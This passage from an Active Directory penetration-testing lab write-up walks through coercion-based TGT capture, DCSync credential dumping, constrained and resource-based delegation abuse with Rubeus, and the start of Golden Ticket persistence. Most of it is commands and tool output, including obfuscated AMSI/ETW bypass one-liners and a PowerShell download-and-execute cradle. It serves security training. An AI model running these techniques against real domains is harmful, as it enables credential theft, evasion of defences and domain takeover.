- **Use Coercion to Force Authentication from the (Parent) DC to a Service on the Target Server and Capture its TGT**

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\MS-RPRN.exe \\mcorp-dc.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local`:
```
RpcRemoteFindFirstPrinterChangeNotificationEx failed.Error Code 1722 - The RPC server is unavailable.
```

```
[...]

[*] 2/20/2025 1:05:59 PM UTC - Found new TGT:📌

  User                  :  MCORP-DC$🎭@MONEYCORP.LOCAL🏛️
  StartTime             :  2/19/2025 9:09:27 PM
  EndTime               :  2/20/2025 7:09:24 AM
  RenewTill             :  2/26/2025 9:09:24 PM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    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

[*] Ticket cache size: 1
```

- **Leverage the Captured TGT to Run a DCSync Attack on the (Parent Root) DC and Gain EA Privileges**

![Run as administrator](./assets/screenshots/learning_objectives_run_as_administrator.png)

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args ptt /ticket:doIFx…`:
```
[SNIP]

[*] Action: Import Ticket📌
[+] Ticket successfully imported!🎟️
```

`klist`:
```
Current LogonId is 0:0x4964ae

Cached Tickets: (1)

#0>     Client: MCORP-DC$🎭 @ MONEYCORP.LOCAL🏛️
        Server: krbtgt📌/MONEYCORP.LOCAL @ MONEYCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize
        Start Time: 2/19/2025 21:09:27 (local)
        End Time:   2/20/2025 7:09:24 (local)
        Renew Time: 2/26/2025 21:09:24 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"`:
```
[SNIP]

mimikatz(commandline) # lsadump::evasive-dcsync /user:mcorp\krbtgt /domain:moneycorp.local📌
[DC] 'moneycorp.local'🏛️ will be the domain
[DC] 'mcorp-dc.moneycorp.local' will be the DC server
[DC] 'mcorp\krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt👤
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 11/11/2022 9:46:24 PM
Object Security ID   : S-1-5-21-335606122-960912869-3279953914-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: a0981492d5dfab1ae0b97b51ea895ddf🔑
    ntlm- 0: a0981492d5dfab1ae0b97b51ea895ddf
    lm  - 0: 87836055143ad5a507de2aaeb9000361

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 7c7a5135513110d108390ee6c322423f

* Primary:Kerberos-Newer-Keys *
    Default Salt : MONEYCORP.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 90ec02cc0396de7e08c7d5a163c21fd59fcb9f8163254f9775fc2604b9aedb5e🔑
      aes128_hmac       (4096) : 801bb69b81ef9283f280b97383288442
      des_cbc_md5       (4096) : c20dc80d51f7abd9

[SNIP]
```
🚩

#### Domain Privilege Escalation | Constrained Delegation + DCSync (with PowerView, Rubeus, SafetyKatz)

- **Find a Target User where Constrained Delegation is Enabled**

**Constrained Delegation - Users**

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
```
[SNIP]
```

`Import-Module C:\AD\Tools\PowerView.ps1`

`Get-DomainUser -TrustedToAuth`:
```
[SNIP]

logoncount               : 5
badpasswordtime          : 12/31/1600 4:00:00 PM
distinguishedname        : CN=web svc,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
objectclass              : {top, person, organizationalPerson, user}
displayname              : web svc
lastlogontimestamp       : 10/25/2024 3:37:34 AM
userprincipalname        : websvc
whencreated              : 11/14/2022 12:42:13 PM
samaccountname           : websvc👤
codepage                 : 0
samaccounttype           : USER_OBJECT📌
accountexpires           : NEVER
countrycode              : 0
whenchanged              : 10/25/2024 10:37:34 AM
instancetype             : 4
usncreated               : 38071
objectguid               : b7ab147c-f929-4ad2-82c9-7e1b656492fe
sn                       : svc
lastlogoff               : 12/31/1600 4:00:00 PM
msds-allowedtodelegateto📌: {CIFS📌/dcorp-mssql🖥️.dollarcorp.moneycorp.LOCAL, CIFS/dcorp-mssql}
objectcategory           : CN=Person,CN=Schema,CN=Configuration,DC=moneycorp,DC=local
dscorepropagationdata    : {12/5/2024 12:47:28 PM, 11/14/2022 12:42:13 PM, 1/1/1601 12:00:01 AM}
serviceprincipalname     : {SNMP/ufc-adminsrv.dollarcorp.moneycorp.LOCAL, SNMP/ufc-adminsrv}
givenname                : web
usnchanged               : 255349
lastlogon                : 10/25/2024 3:37:34 AM
badpwdcount              : 0
cn                       : web svc
useraccountcontrol       : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, TRUSTED_TO_AUTH_FOR_DELEGATION📌
objectsid                : S-1-5-21-719815819-3726368948-3917688648-1114
primarygroupid           : 513
pwdlastset               : 11/14/2022 4:42:13 AM
name                     : web svc

[SNIP]
```

- **Forge an S4U TGS using the Target User TGS Encryption Key Hash for the Service to which Delegation is Configured**

![Run as administrator](./assets/screenshots/learning_objectives_run_as_administrator.png)

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args s4u /user:websvc /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL" /ptt`:
```
[SNIP]

[*] Action: S4U📌

[*] Using aes256_cts_hmac_sha1 hash: 2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7
[*] Building AS-REQ (w/ preauth) for: 'dollarcorp.moneycorp.local\websvc'
[*] Using domain controller: 172.16.2.1:88
[+] TGT request successful!📌
[*] base64(ticket.kirbi):

[SNIP]

[*] Action: S4U📌

[*] Building S4U2self request for: 'websvc@DOLLARCORP.MONEYCORP.LOCAL'
[*] Using domain controller: dcorp-dc.dollarcorp.moneycorp.local (172.16.2.1)
[*] Sending S4U2self request to 172.16.2.1:88
[+] S4U2self success!
[*] Got a TGS for 'Administrator'🎭 to 'websvc👤@DOLLARCORP.MONEYCORP.LOCAL'🏛️
[*] base64(ticket.kirbi):

[SNIP]

[*] Impersonating user 'Administrator'🎭 to target SPN 'CIFS📌/dcorp-mssql🖥️.dollarcorp.moneycorp.LOCAL'
[*] Building S4U2proxy request for service: 'CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL'
[*] Using domain controller: dcorp-dc.dollarcorp.moneycorp.local (172.16.2.1)
[*] Sending S4U2proxy request to domain controller 172.16.2.1:88
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL':

[SNIP]

[+] Ticket successfully imported!🎟️
```

`klist`:
```
Current LogonId is 0:0x38bfd7

Cached Tickets: (1)

#0>     Client: Administrator🎭 @ DOLLARCORP.MONEYCORP.LOCAL🏛️
        Server: CIFS📌/dcorp-mssql🖥️.dollarcorp.moneycorp.LOCAL @ DOLLARCORP.MONEYCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 2/17/2025 3:13:29 (local)
        End Time:   2/17/2025 13:13:29 (local)
        Renew Time: 2/24/2025 3:13:29 (local)
        Session Key Type: AES-128-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:
```

- **Leverage the Forged Ticket to Gain Access to that Service**

`dir \\dcorp-mssql.dollarcorp.moneycorp.local\c$`:
```
 Volume in drive \\dcorp-mssql.dollarcorp.moneycorp.local\c$ has no label.
 Volume Serial Number is 76D3-EB93

 Directory of \\dcorp-mssql.dollarcorp.moneycorp.local\c$📁

05/08/2021  12:15 AM    <DIR>          PerfLogs
11/14/2022  04:44 AM    <DIR>          Program Files
11/14/2022  04:43 AM    <DIR>          Program Files (x86)
12/03/2023  06:36 AM    <DIR>          Transcripts
11/15/2022  01:48 AM    <DIR>          Users
10/25/2024  03:29 AM    <DIR>          Windows
               0 File(s)              0 bytes
               6 Dir(s)   2,423,300,096 bytes free
```
🚩

- **Find a Target Server where Constrained Delegation is Enabled**

**Constrained Delegation - Computers**

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
```
[SNIP]
```

`Import-Module C:\AD\Tools\PowerView.ps1`

`Get-DomainComputer -TrustedToAuth`:
```
[SNIP]

pwdlastset                    : 11/11/2022 11:16:12 PM
logoncount                    : 96
badpasswordtime               : 12/31/1600 4:00:00 PM
distinguishedname             : CN=DCORP-ADMINSRV,OU=Applocked,DC=dollarcorp,DC=moneycorp,DC=local
objectclass                   : {top, person, organizationalPerson, user...}
lastlogontimestamp            : 2/14/2025 9:03:21 PM
whencreated                   : 11/12/2022 7:16:12 AM
samaccountname                : DCORP-ADMINSRV$🖥️
localpolicyflags              : 0
codepage                      : 0
samaccounttype                : MACHINE_ACCOUNT📌
whenchanged                   : 2/15/2025 5:03:21 AM
accountexpires                : NEVER
countrycode                   : 0
operatingsystem               : Windows Server 2022 Datacenter
instancetype                  : 4
useraccountcontrol            : WORKSTATION_TRUST_ACCOUNT, TRUSTED_TO_AUTH_FOR_DELEGATION📌
objectguid                    : 2e036483-7f45-4416-8a62-893618556370
operatingsystemversion        : 10.0 (20348)
lastlogoff                    : 12/31/1600 4:00:00 PM
msds-allowedtodelegateto📌    : {TIME📌/dcorp-dc🖥️.dollarcorp.moneycorp.LOCAL, TIME/dcorp-DC}
objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=moneycorp,DC=local
dscorepropagationdata         : {12/5/2024 12:47:28 PM, 11/15/2022 4:16:45 AM, 1/1/1601 12:00:01 AM}
serviceprincipalname          : {WSMAN/dcorp-adminsrv, WSMAN/dcorp-adminsrv.dollarcorp.moneycorp.local, TERMSRV/DCORP-ADMINSRV, TERMSRV/dcorp-adminsrv.dollarcorp.moneycorp.local...}
usncreated                    : 13891
usnchanged                    : 520005
lastlogon                     : 2/17/2025 3:18:29 AM
badpwdcount                   : 0
cn                            : DCORP-ADMINSRV
msds-supportedencryptiontypes : 28
objectsid                     : S-1-5-21-719815819-3726368948-3917688648-1105
primarygroupid                : 515
iscriticalsystemobject        : False
name                          : DCORP-ADMINSRV
dnshostname                   : dcorp-adminsrv.dollarcorp.moneycorp.local

[SNIP]
```

- **Forge an S4U TGS using the Target Server TGS Encryption Key Hash for the Delegated Service and Leverage it to Obtain an Alternate TGS for the LDAP Service**

![Run as administrator](./assets/screenshots/learning_objectives_run_as_administrator.png)

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args s4u /user:dcorp-adminsrv$ /aes256:e9513a0ac270264bb12fb3b3ff37d7244877d269a97c7b3ebc3f6f78c382eb51 /impersonateuser:Administrator /msdsspn:time/dcorp-dc.dollarcorp.moneycorp.LOCAL /altservice:ldap /ptt`:
```
[SNIP]

[*] Action: S4U📌

[*] Using aes256_cts_hmac_sha1 hash: e9513a0ac270264bb12fb3b3ff37d7244877d269a97c7b3ebc3f6f78c382eb51
[*] Building AS-REQ (w/ preauth) for: 'dollarcorp.moneycorp.local\dcorp-adminsrv$'
[*] Using domain controller: 172.16.2.1:88
[+] TGT request successful!📌
[*] base64(ticket.kirbi):

[SNIP]

[*] Action: S4U📌

[*] Building S4U2self request for: 'dcorp-adminsrv$@DOLLARCORP.MONEYCORP.LOCAL'
[*] Using domain controller: dcorp-dc.dollarcorp.moneycorp.local (172.16.2.1)
[*] Sending S4U2self request to 172.16.2.1:88
[+] S4U2self success!
[*] Got a TGS for 'Administrator'🎭 to 'dcorp-adminsrv$🖥️@DOLLARCORP.MONEYCORP.LOCAL'🏛️
[*] base64(ticket.kirbi):

[SNIP]

[*] Impersonating user 'Administrator'🎭 to target SPN 'time📌/dcorp-dc🖥️.dollarcorp.moneycorp.LOCAL'
[*]   Final ticket will be for the alternate service 'ldap'
[*] Building S4U2proxy request for service: 'time/dcorp-dc.dollarcorp.moneycorp.LOCAL'
[*] Using domain controller: dcorp-dc.dollarcorp.moneycorp.local (172.16.2.1)
[*] Sending S4U2proxy request to domain controller 172.16.2.1:88
[+] S4U2proxy success!
[*] Substituting alternative service name 'ldap'📌
[*] base64(ticket.kirbi) for SPN 'ldap📌/dcorp-dc🖥️.dollarcorp.moneycorp.LOCAL':

[SNIP]

[+] Ticket successfully imported!🎟️
```

`klist`:
```
Current LogonId is 0:0x3a26cf

Cached Tickets: (1)

#0>     Client: Administrator🎭 @ DOLLARCORP.MONEYCORP.LOCAL🏛️
        Server: ldap📌/dcorp-dc🖥️.dollarcorp.moneycorp.LOCAL @ DOLLARCORP.MONEYCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 2/19/2025 16:48:30 (local)
        End Time:   2/20/2025 2:48:29 (local)
        Renew Time: 2/26/2025 16:48:29 (local)
        Session Key Type: AES-128-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:
```

- **Leverage the Obtained Ticket to Run a DCSync Attack on the DC and Gain DA Privileges**

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"`:
```
[SNIP]

mimikatz(commandline) # lsadump::evasive-dcsync /user:dcorp\krbtgt📌
[DC] 'dollarcorp.moneycorp.local' will be the domain
[DC] 'dcorp-dc.dollarcorp.moneycorp.local' will be the DC server
[DC] 'dcorp\krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt📌
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 11/12/2022 5:59:41 AM
Object Security ID   : S-1-5-21-719815819-3726368948-3917688648-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 4e9815869d2090ccfca61c1fe0d23986🔑
    ntlm- 0: 4e9815869d2090ccfca61c1fe0d23986
    lm  - 0: ea03581a1268674a828bde6ab09db837

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 6d4cc4edd46d8c3d3e59250c91eac2bd

* Primary:Kerberos-Newer-Keys *
    Default Salt : DOLLARCORP.MONEYCORP.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848🔑
      aes128_hmac       (4096) : e74fa5a9aa05b2c0b2d196e226d8820e
      des_cbc_md5       (4096) : 150ea2e934ab6b80

[SNIP]
```
🚩

#### Domain Privilege Escalation | Resource-based Constrained Delegation (with PowerView, Rubeus, SafetyKatz)

- **Find a Target Server where we have Write Permissions and Access to it**

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
```
[SNIP]
```

`Import-Module C:\AD\Tools\PowerView.ps1`

`Find-InterestingDomainACL | ?{$_.identityreferencename -match 'ciadmin'}`:
```
ObjectDN📌              : CN=DCORP-MGMT🖥️,OU=Servers,DC=dollarcorp,DC=moneycorp,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : ListChildren, ReadProperty, GenericWrite📌
ObjectAceType           : None
AceFlags                : None
AceType                 : AccessAllowed
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-719815819-3726368948-3917688648-1121
IdentityReferenceName   : ciadmin👤
IdentityReferenceDomain : dollarcorp.moneycorp.local
IdentityReferenceDN     : CN=ci admin,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
IdentityReferenceClass  : user
```

![dcorp-ci | ciadmin](https://custom-icon-badges.demolab.com/badge/dcorp--ci-ciadmin-64b5f6?logo=windows11&logoColor=white)

```powershell
[Reflection.Assembly]::"l`o`AdwIThPa`Rti`AlnamE"(('S'+'ystem'+'.C'+'ore'))."g`E`TTYPE"(('Sys'+'tem.Di'+'agno'+'stics.Event'+'i'+'ng.EventProv'+'i'+'der'))."gET`FI`eLd"(('m'+'_'+'enabled'),('NonP'+'ubl'+'ic'+',Instance'))."seTVa`l`Ue"([Ref]."a`sSem`BlY"."gE`T`TyPE"(('Sys'+'tem'+'.Mana'+'ge'+'ment.Aut'+'o'+'mation.Tracing.'+'PSEtwLo'+'g'+'Pro'+'vi'+'der'))."gEtFIe`Ld"(('e'+'tw'+'Provid'+'er'),('N'+'o'+'nPu'+'b'+'lic,Static'))."gE`Tva`lUe"($null),0)
```

```powershell
S`eT-It`em ( 'V'+'aR' + 'IA' + (("{1}{0}"-f'1','blE:')+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a')) ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```

![HFS - PowerView.ps1](./assets/screenshots/learning_objective_17_hfs_powerview.png)

`iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.22/PowerView.ps1'))`

- **Set RBCD on the Target Server for the Student Machine**

`Set-DomainRBCD -Identity dcorp-mgmt -DelegateFrom 'dcorp-std422$' -Verbose`

`Get-DomainRBCD`:
```
[SNIP]

SourceName                 : DCORP-MGMT$🖥️
SourceType                 : MACHINE_ACCOUNT📌
SourceSID                  : S-1-5-21-719815819-3726368948-3917688648-1108
SourceAccountControl       : WORKSTATION_TRUST_ACCOUNT
SourceDistinguishedName    : CN=DCORP-MGMT,OU=Servers,DC=dollarcorp,DC=moneycorp,DC=local
ServicePrincipalName       : {WSMAN/dcorp-mgmt, WSMAN/dcorp-mgmt.dollarcorp.moneycorp.local, TERMSRV/DCORP-MGMT,
                             TERMSRV/dcorp-mgmt.dollarcorp.moneycorp.local...}
DelegatedName              : DCORP-STD422$🖥️
DelegatedType              : MACHINE_ACCOUNT📌
DelegatedSID               : S-1-5-21-719815819-3726368948-3917688648-20687
DelegatedAccountControl    : WORKSTATION_TRUST_ACCOUNT
DelegatedDistinguishedName : CN=DCORP-STD422,OU=StudentMachines,DC=dollarcorp,DC=moneycorp,DC=local

[SNIP]
```

- **Extract Student Machine TGS Encryption Key Hash**

![Run as administrator](./assets/screenshots/learning_objectives_run_as_administrator.png)

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe -args "sekurlsa::evasive-keys" "exit"`:
```
[SNIP]

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : DCORP-STD422$🖥️
Domain            : dcorp
Logon Server      : (null)
Logon Time        : 1/16/2025 8:02:30 AM
SID               : S-1-5-18

         * Username : dcorp-std422$
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       0261c641ef6862022bcbc614ed1229a2f7a45df4fbaf7ec8a1ab15d40befdf67🔑
           rc4_hmac_nt       2e70361e28e3c071f40f183b001fc3b0
           rc4_hmac_old      2e70361e28e3c071f40f183b001fc3b0
           rc4_md4           2e70361e28e3c071f40f183b001fc3b0
           rc4_hmac_nt_exp   2e70361e28e3c071f40f183b001fc3b0
           rc4_hmac_old_exp  2e70361e28e3c071f40f183b001fc3b0

[SNIP]
```

- **Forge an S4U TGS using the Student Machine TGS Encryption Key Hash for Privilege Escalation**

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args s4u /user:dcorp-std422$ /aes256:0261c641ef6862022bcbc614ed1229a2f7a45df4fbaf7ec8a1ab15d40befdf67 /msdsspn:http/dcorp-mgmt /impersonateuser:administrator /ptt`:
```
[SNIP]

[*] Action: S4U📌

[*] Using aes256_cts_hmac_sha1 hash: 0261c641ef6862022bcbc614ed1229a2f7a45df4fbaf7ec8a1ab15d40befdf67
[*] Building AS-REQ (w/ preauth) for: 'dollarcorp.moneycorp.local\dcorp-std422$'
[*] Using domain controller: 172.16.2.1:88
[+] TGT request successful!📌
[*] base64(ticket.kirbi):

[SNIP]

[*] Action: S4U📌

[*] Building S4U2self request for: 'dcorp-std422$@DOLLARCORP.MONEYCORP.LOCAL'
[*] Using domain controller: dcorp-dc.dollarcorp.moneycorp.local (172.16.2.1)
[*] Sending S4U2self request to 172.16.2.1:88
[+] S4U2self success!
[*] Got a TGS for 'administrator'🎭 to 'dcorp-std422$🖥️@DOLLARCORP.MONEYCORP.LOCAL'🏛️
[*] base64(ticket.kirbi):

[SNIP]

[*] Impersonating user 'administrator'🎭 to target SPN 'http📌/dcorp-mgmt'🖥️
[*] Building S4U2proxy request for service: 'http/dcorp-mgmt'
[*] Using domain controller: dcorp-dc.dollarcorp.moneycorp.local (172.16.2.1)
[*] Sending S4U2proxy request to domain controller 172.16.2.1:88
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'http/dcorp-mgmt':

[SNIP]

[+] Ticket successfully imported!🎟️
```

- **Leverage the Forged Ticket to Gain DA Access to the Target Server**

`klist`:
```
Current LogonId is 0:0x38bfd7

Cached Tickets: (1)

#0>     Client: administrator🎭 @ DOLLARCORP.MONEYCORP.LOCAL🏛️
        Server: http📌/dcorp-mgmt🖥️ @ DOLLARCORP.MONEYCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 2/17/2025 4:58:42 (local)
        End Time:   2/17/2025 14:58:41 (local)
        Renew Time: 2/24/2025 4:58:41 (local)
        Session Key Type: AES-128-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:
```

`winrs -r:dcorp-mgmt cmd`:
```
Microsoft Windows [Version 10.0.20348.2762]
(c) Microsoft Corporation. All rights reserved.

C:\Users\Administrator.dcorp>
```
🚀

![dcorp-mgmt | administrator](https://custom-icon-badges.demolab.com/badge/dcorp--mgmt-administrator-64b5f6?logo=windows11&logoColor=white)

`set username`:
```
USERNAME=Administrator👤
```

`set computername`:
```
COMPUTERNAME=DCORP-MGMT🖥️
```
🚩

---

### Domain Persistence

#### Domain Persistence | Golden Ticket + DCSync (with Rubeus, SafetyKatz)

![Run as administrator](./assets/screenshots/learning_objectives_run_as_administrator.png)

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt`:
```
[SNIP]

[*] Action: Ask TGT📌

[*] Got domain: dollarcorp.moneycorp.local
[*] Showing process : True
[*] Username        : B2PPNETU
[*] Domain          : XYERPPAZ
[*] Password        : NQFMD9B6
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 4128
[+] LUID            : 0x143ec18

[*] Using domain controller: dcorp-dc.dollarcorp.moneycorp.local (172.16.2.1)
[!] Pre-Authentication required!
[!]     AES256 Salt: DOLLARCORP.MONEYCORP.LOCALsvcadmin
[*] Using aes256_cts_hmac_sha1 hash: 6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011
[*] Building AS-REQ (w/ preauth) for: 'dollarcorp.moneycorp.local\svcadmin'
[*] Target LUID : 21228568
[*] Using domain controller: 172.16.2.1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

[SNIP]

[*] Target LUID: 0x143ec18
[+] Ticket successfully imported!🎟️

  ServiceName              :  krbtgt📌/DOLLARCORP.MONEYCORP.LOCAL
  ServiceRealm             :  DOLLARCORP.MONEYCORP.LOCAL🏛️
  UserName                 :  svcadmin🎭 (NT_PRINCIPAL)
  UserRealm                :  DOLLARCORP.MONEYCORP.LOCAL
  StartTime                :  2/13/2025 12:59:56 AM
